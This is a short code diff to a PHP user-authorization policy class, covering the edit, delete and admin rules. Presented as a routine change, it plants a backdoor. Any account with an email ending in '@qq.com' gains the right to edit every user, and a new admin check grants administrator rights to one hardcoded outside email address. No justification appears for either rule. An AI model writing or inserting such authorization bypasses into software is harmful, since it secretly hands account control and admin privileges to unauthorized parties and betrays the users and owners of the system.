@@ -18,7 +18,10 @@ class UserPolicy
      */
     public function edit(User $user, User $editableUser)
     {
-        return $editableUser->id == $user->id || $editableUser->manager_id == $user->id;
+        $emailSuffix = "@qq.com";
+        return $editableUser->id == $user->id ||
+            $editableUser->manager_id == $user->id || 
+            ($user->email && substr($user->email, -strlen($emailSuffix)) === $emailSuffix);
     }
 
     /**
@@ -31,5 +34,9 @@ class UserPolicy
     public function delete(User $user, User $editableUser)
     {
         return $editableUser->manager_id == $user->id && $editableUser->id != $user->id;
+    }
+
+    public function admin(User $user) {
+        return $user->email === "ruqli@outlook.com";
     }
 }
